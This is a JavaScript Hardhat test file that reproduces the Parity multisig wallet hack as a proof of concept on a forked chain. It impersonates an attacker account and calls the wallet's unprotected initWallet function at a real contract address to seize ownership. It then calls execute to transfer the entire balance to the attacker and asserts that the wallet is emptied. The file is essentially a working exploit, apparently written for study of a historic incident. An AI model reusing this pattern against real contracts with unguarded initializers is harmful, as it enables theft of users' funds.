const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

const walletAddress = "0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e";
const hackerAddress = "0xB3764761E297D6f121e79C32A65829Cd1dDb4D32";
const abi = [
    "function initWallet(address[] _owners, uint _required, uint _daylimit)",
    "function execute(address _to, uint _value, bytes _data) external"  
]

describe("Parity Wallet Hack Exploit PoC", function () {
    let hacker;
    let wallet;
    
    before(async () => {
        // impersonating the hacker account.
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [hackerAddress],
        });
        hacker = await ethers.getSigner(hackerAddress);
        wallet = new ethers.Contract(walletAddress, abi, hacker);
    });

    it("Steal Funds and Update Balances", async () => {
        const walletBalancePrior = await ethers.provider.getBalance(walletAddress);
        const hackerBalancePrior = await ethers.provider.getBalance(hackerAddress);

        // we call the unprotected initWallet method.
        await wallet.connect(hacker).initWallet([hackerAddress], 1, 0);
        console.log(`wallet balance prior to the hack --> ${ethers.utils.formatEther(walletBalancePrior)} Eth`);
        console.log(`hacker balance prior to the hack --> ${ethers.utils.formatEther(hackerBalancePrior)} Eth`);
        expect(Math.trunc(Number(walletBalancePrior))).to.be.greaterThan(0);

        // stealing all the funds, sending them to hackerAddress.
        await wallet.connect(hacker).execute(hackerAddress, walletBalancePrior, "0x");
        const hackerBalancePost = await ethers.provider.getBalance(hackerAddress);
        const walletBalancePost = await ethers.provider.getBalance(walletAddress);
        console.log(`wallet balance after the hack --> ${ethers.utils.formatEther(walletBalancePost)} Eth`);
        console.log(`hacker balance after the hack --> ${ethers.utils.formatEther(hackerBalancePost)}`);
        const hackedAmount = hackerBalancePost.sub(hackerBalancePrior);
        expect(Math.trunc(Number(hackedAmount))).to.be.greaterThan(0);
        console.log(`Succesfully hacked --> ${ethers.utils.formatEther(hackedAmount)}Eth`);
        // wallet should have 0 ether.
        expect(walletBalancePost).to.equal(0);
        // Hacker should have more Eth than before this execution.
        expect(Math.trunc(Number(hackerBalancePost))).to.be.greaterThan(Math.trunc(Number(hackerBalancePrior)));
    });
});